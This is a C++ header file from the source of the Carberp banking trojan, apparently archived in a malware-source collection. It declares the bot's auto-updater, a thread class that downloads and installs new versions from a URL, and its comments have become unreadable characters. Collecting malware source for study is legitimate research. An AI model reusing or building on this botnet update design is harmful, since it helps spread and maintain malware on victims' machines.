/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#ifndef BotAutoUpdateH
#define BotAutoUpdateH
//---------------------------------------------------------------------------


#include "Strings.h"
#include "BotClasses.h"


//************************************************************
//	TBotUpdater - ����� ��������������� ���������� ����
//************************************************************
class TBotUpdater : public TBotThread
{
private:
	void Update(DWORD &UpdateInterval);
	void DownloadAndSetup(const string &FileURL, const string &MD5);
protected:
    void DoExecute();
public:
	DWORD Interval;
    TBotUpdater();

};


//--------------------------------------------------
//  StartAutoUpdate - ������� ���������
//  �������������� ���������� ����
//--------------------------------------------------
void StartAutoUpdate();



//---------------------------------------------------------------------------
#endif
